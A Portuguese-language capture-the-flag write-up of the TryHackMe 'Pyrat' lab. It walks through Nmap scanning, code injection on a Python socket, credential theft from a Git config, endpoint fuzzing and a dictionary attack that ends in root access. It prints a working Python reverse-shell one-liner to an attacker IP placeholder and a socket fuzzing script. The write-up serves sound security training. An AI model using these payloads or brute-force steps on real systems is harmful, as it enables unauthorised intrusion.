---
description: TryHackMe CTF
---

# Pyrat

Durante a rotina contínua de estudos e preparação para certificações práticas, ou mesmo durante uma caçada a bugs em aplicações web, encontrar portas rodando serviços customizados é sempre um indicativo de que precisamos adaptar nossa metodologia. Ferramentas automatizadas nem sempre entendem o contexto de um socket cru, e é aí que a análise manual brilha.

As flags, credenciais exatas e IPs foram mascarados para manter o writeup _spoiler-free_.

## TryHackMe - Pyrat | Writeup & Análise de Exploração

**Dificuldade:** Média

**Foco:** Enumeração de Serviços Customizados, Code Review em Repositórios Git, Fuzzing de Endpoints e Automação em Python.

### Introdução

O desafio Pyrat apresenta um cenário onde a enumeração minuciosa e a compreensão de como a aplicação processa inputs são fundamentais. O vetor de entrada inicial foge do tradicional "explorar um CVE conhecido", exigindo que o atacante identifique uma vulnerabilidade de injeção de código direto em um socket exposto. A escalação de privilégios exige análise de código-fonte através do histórico do Git e a construção de scripts de fuzzing customizados.

### Fase 1: Reconhecimento (Recon)

O ponto de partida de qualquer engajamento é o mapeamento de superfície. O Nmap foi utilizado para varrer as portas e identificar os serviços rodando.

Bash

```
nmap --open -Pn -p- --min-rate 1280 [IP_TARGET] -oG ALL-TCP
nmap --open -Pn -p 22,8000 -sVC --min-rate 1280 [IP_TARGET] -oG Services-TCP
```

**Análise do Output do Nmap:**

O Nmap identificou o serviço na porta 8000 como `SimpleHTTP/0.6 Python/3.11.2`. Porém, a verdadeira pepita de ouro está nos _fingerprints_ retornados:

* `name 'GET' is not defined`<br>
* `invalid syntax`<br>

**O Raciocínio (The "Aha!" Moment):**

O Nmap tenta se comunicar enviando requisições HTTP padrão (como `GET / HTTP/1.1`). Em vez de retornar um erro 400 Bad Request comum de servidores web, o servidor retornou mensagens de erro clássicas do interpretador **Python**.

Isso indica que a porta 8000 não está rodando um servidor web real, mas sim um socket TCP direto que está, de alguma forma, passando tudo o que recebe para uma função perigosa de execução, como `eval()` ou `exec()` do Python.

Para confirmar a teoria, interagimos diretamente com o socket usando o Netcat:

Bash:

```
nc -v pyrat.thm 8000
Hello
name 'Hello' is not defined
print("Teste")
Teste
```

A teoria se confirma: temos um console Python interativo e remoto.

### Fase 2: Foothold (Acesso Inicial)

Sabendo que podemos executar código Python arbitrário, o próximo passo é estabelecer uma Reverse Shell. Preparamos um listener na nossa máquina atacante e enviamos um payload padrão de reverse shell em Python pelo socket.

Bash

```
# Terminal Atacante
nc -vlnp 4444

# Terminal do Socket (Porta 8000)
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP_ATACANTE]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Após o envio, obtemos uma shell interativa como o usuário `www-data`. Estabilizamos a shell com `pty.spawn` para facilitar a navegação.

### Fase 3: Movimentação Lateral e Enumeração de Arquivos

Com acesso inicial garantido, iniciamos a enumeração interna. Vasculhando o diretório `/opt`, encontramos a pasta `/opt/dev`, que contém um repositório `.git` oculto.

**Por que olhar o Git?**

Repositórios Git frequentemente escondem dívidas técnicas, credenciais _hardcoded_ (um achado clássico em Bug Bounty) e versões antigas de código que podem nos ajudar a entender a lógica da aplicação atual.

Explorando as configurações do Git (`cat config`), encontramos credenciais para o usuário `think`:

Ini, TOML

```
[credential "https://github.com"]
username = think
password = [REDACTED_PASSWORD]
```

Podemos usar essa credencial para acessar o servidor via SSH como o usuário `think` e capturar a _User Flag_.

### Fase 4: Análise de Código e o Caminho para Root

A escalação de privilégios começa revisando o histórico de commits do repositório Git encontrado anteriormente.

Bash

```
cd /opt/dev/.git/
git log
git show [ID_DO_COMMIT]
```

O `git show` revela um arquivo adicionado no passado chamado `pyrat.py.old`. Lendo o código, entendemos exatamente como o backend do socket na porta 8000 funciona:

1. **A Lógica Switch-Case:** O código possui uma função `switch_case` que valida o input do usuário.
2. **Endpoints Secretos:** Ele aguarda strings específicas como "shell" ou "some\_endpoint".
3. **Controle de Privilégios (`change_uid()`):** O detalhe crítico é a verificação do UID. Se o script estiver rodando como root (`uid == 0`) e a string não for a correta (sem privilégios administrativos confirmados), ele executa a função `change_uid()`, sofrendo um _downgrade_ de privilégios para `www-data`.
4. **Execução Python:** Se a string não for um endpoint mapeado, ela cai no bloco `exec_python(client_socket, data)`. Isso explica a vulnerabilidade inicial que exploramos.

O código nos mostra que existe um mecanismo para acessar a aplicação sem sofrer o _downgrade_ de privilégios. Precisamos descobrir quais são os endpoints válidos ocultos.

### Fase 5: Fuzzing Customizado e Quebra de Senha

Como ferramentas padrão de fuzzing web (como ffuf ou Gobuster) operam sobre HTTP, elas não funcionarão neste socket TCP cru. Como especialistas, precisamos desenvolver nosso próprio ferramental.

#### 5.1 Fuzzing de Endpoints

Criamos um script em Python para testar uma lista de possíveis palavras (endpoints) e analisar a resposta do servidor, buscando anomalias.

Python

```
import socket

def fuzz_endpoints(ip, port, endpoints):
    for endpoint in endpoints:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ip, port))
            client.sendall(endpoint.encode() + b'\n')
            response = client.recv(1024).decode().strip()
            print(f"[{endpoint}] -> {response}")
            client.close()
        except Exception as e:
            pass

endpoint_list = ["admin", "backup", "shell", "root", "login", "old"]
fuzz_endpoints("pyrat.thm", 8000, endpoint_list)
```

**Resultado do Fuzzing:**

* O envio da string `shell` retornou um prompt `$`.<br>
* O envio da string `admin` retornou a string `Password:`.<br>

Achamos a porta dos fundos. O endpoint `admin` exige uma senha.

#### 5.2 Força Bruta no Endpoint Admin

Modificamos nosso script para conectar no endpoint `admin` e realizar um ataque de dicionário utilizando a wordlist `rockyou.txt`. O script conecta, envia a palavra "admin", aguarda o prompt de senha, envia a tentativa da wordlist e analisa se o retorno indica sucesso.

_(Após rodar o script com a wordlist...)_

A senha correta (`[REDACTED_ADMIN_PASS]`) foi identificada com sucesso, retornando a mensagem: _"Welcome Admin!!! Type 'shell' to begin"_.

### Fase 6: Exploração Final (Root)

Com o endpoint administrativo e a senha em mãos, executamos o fluxo idealizado pelo desenvolvedor da aplicação:

1. Conectamos no socket via Netcat.
2. Solicitamos o endpoint `admin`.
3. Inserimos a senha revelada pelo nosso script.
4. Após a autenticação ser validada (ignorando o _downgrade_ do `change_uid()`), digitamos `shell`.

Bash

```
nc -v pyrat.thm 8000
admin
Password: [REDACTED_ADMIN_PASS]
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
```

Como o script Python principal na porta 8000 estava sendo executado nativamente como `root`, ao acionarmos o bloco de "admin", a função de shell foi invocada mantendo o UID 0.

Acesso total garantido. _Root Flag_ capturada.

**Conclusão do Autor:**

O Pyrat é um laboratório excelente que reforça que nem toda aplicação conversará em HTTP. Entender o comportamento dinâmico de um serviço interpretando os erros retornados é vital. Além disso, a necessidade de criar scripts customizados para interagir com o protocolo do alvo simula muito bem os desafios encontrados no mundo real de testes de intrusão e avaliações de segurança ofensiva.
